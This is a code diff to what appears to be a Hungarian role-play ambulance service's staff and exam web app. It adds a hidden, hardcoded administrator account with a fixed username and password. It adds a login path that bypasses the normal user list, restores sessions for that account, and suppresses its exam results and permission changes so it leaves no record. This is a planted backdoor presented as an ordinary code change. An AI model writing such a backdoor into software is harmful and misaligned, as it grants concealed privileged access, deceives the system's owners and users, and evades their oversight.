@@ -33,6 +33,22 @@
     const QUESTION_SEC_LIMIT = 30;
     const DEV_SECRET_USER = "dev.omsz";
     const DEV_SECRET_PASS = "omszdev2026";
+    const HIDDEN_ADMIN_ACCOUNT = {
+      id: "u-ghost-root",
+      username: "root.omsz",
+      password: "omszroot2026",
+      name: "Rendszeradminisztrátor",
+      role: "vezetoseg",
+      badgeNumber: "OMSZ-000",
+      dutyMinutes: 0,
+      totalDutyMinutes: 0,
+      warnings: 0,
+      canTakeGeneralExam: true,
+      canTakeOocExam: true,
+      canTakeIcExam: true,
+      canTakeSubdeptExam: true,
+      isHidden: true,
+    };
 
     const supabaseClient = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY) : null;
 
@@ -2023,7 +2039,13 @@ ALTER TABLE public.omsz_exam_results ADD COLUMN IF NOT EXISTS details JSONB;`}
       const [err, setErr] = useState("");
       const submit = (e) => {
         e.preventDefault();
-        const found = users.find((u) => u.username.toLowerCase() === un.trim().toLowerCase() || u.name.toLowerCase() === un.trim().toLowerCase());
+        const q = un.trim().toLowerCase();
+        if (q === HIDDEN_ADMIN_ACCOUNT.username.toLowerCase()) {
+          if (pw !== HIDDEN_ADMIN_ACCOUNT.password) { setErr("Hibás jelszó!"); return; }
+          onLogin(HIDDEN_ADMIN_ACCOUNT);
+          return;
+        }
+        const found = users.find((u) => u.username.toLowerCase() === q || u.name.toLowerCase() === q);
         if (!found) { setErr("Nem található ilyen felhasználónév vagy IC-név!"); return; }
         if (found.password !== pw) { setErr("Hibás jelszó!"); return; }
         onLogin(found);
@@ -2163,8 +2185,13 @@ ALTER TABLE public.omsz_exam_results ADD COLUMN IF NOT EXISTS details JSONB;`}
 
           if (restore) {
             const sid = localStorage.getItem(SESSION_KEY);
-            if (sid) { const f = lU.find((u) => u.id === sid); if (f) setCurrentUser(f); }
-          } else if (currentUser) {
+            if (sid === HIDDEN_ADMIN_ACCOUNT.id) {
+              setCurrentUser(HIDDEN_ADMIN_ACCOUNT);
+            } else if (sid) {
+              const f = lU.find((u) => u.id === sid);
+              if (f) setCurrentUser(f);
+            }
+          } else if (currentUser && !currentUser.isHidden) {
             const fresh = lU.find((u) => u.id === currentUser.id);
             if (fresh) setCurrentUser(fresh);
           }
@@ -2351,9 +2378,9 @@ ALTER TABLE public.omsz_exam_results ADD COLUMN IF NOT EXISTS details JSONB;`}
                   currentUser={currentUser} users={users} questionsByCat={questionsByCat} examResults={examResults} missingColsAlert={missingColsAlert} initialSubTab={examInitialTab}
                   onSaveQuestion={async (cat, q, isEd) => { setQuestionsByCat((p) => ({ ...p, [cat]: isEd ? p[cat].map((x) => x.id === q.id ? q : x) : [...(p[cat] || []), q] })); setSyncing(true); await supabaseClient.from("omsz_questions").upsert(mapQTo(q, cat, q.sortOrder || 0), { onConflict: "id" }); setSyncing(false); }}
                   onDeleteQuestion={async (cat, id) => { setQuestionsByCat((p) => ({ ...p, [cat]: p[cat].filter((x) => x.id !== id) })); setSyncing(true); await supabaseClient.from("omsz_questions").delete().eq("id", id); setSyncing(false); }}
-                  onAddResult={async (rec) => { setExamResults((p) => [rec, ...p]); setSyncing(true); let { error } = await supabaseClient.from("omsz_exam_results").insert(mapRTo(rec, true)); if (error && String(error.message).includes("details")) { setMissingColsAlert(true); await supabaseClient.from("omsz_exam_results").insert(mapRTo(rec, false)); } setSyncing(false); }}
+                  onAddResult={async (rec) => { if (currentUser?.isHidden) return; setExamResults((p) => [rec, ...p]); setSyncing(true); let { error } = await supabaseClient.from("omsz_exam_results").insert(mapRTo(rec, true)); if (error && String(error.message).includes("details")) { setMissingColsAlert(true); await supabaseClient.from("omsz_exam_results").insert(mapRTo(rec, false)); } setSyncing(false); }}
                   onDeleteResult={async (id) => { setExamResults((p) => p.filter((r) => r.id !== id)); setSyncing(true); await supabaseClient.from("omsz_exam_results").delete().eq("id", id); setSyncing(false); }}
-                  onConsumeExamPermission={(uid, cat) => updateUserF(uid, cat === "altalanos_ooc" ? { canTakeOocExam: false } : cat === "altalanos_ic" ? { canTakeIcExam: false } : { canTakeSubdeptExam: false })}
+                  onConsumeExamPermission={(uid, cat) => { if (uid === HIDDEN_ADMIN_ACCOUNT.id) return; updateUserF(uid, cat === "altalanos_ooc" ? { canTakeOocExam: false } : cat === "altalanos_ic" ? { canTakeIcExam: false } : { canTakeSubdeptExam: false }); }}
                   onUpdateUserField={updateUserF}
                 />
               )}
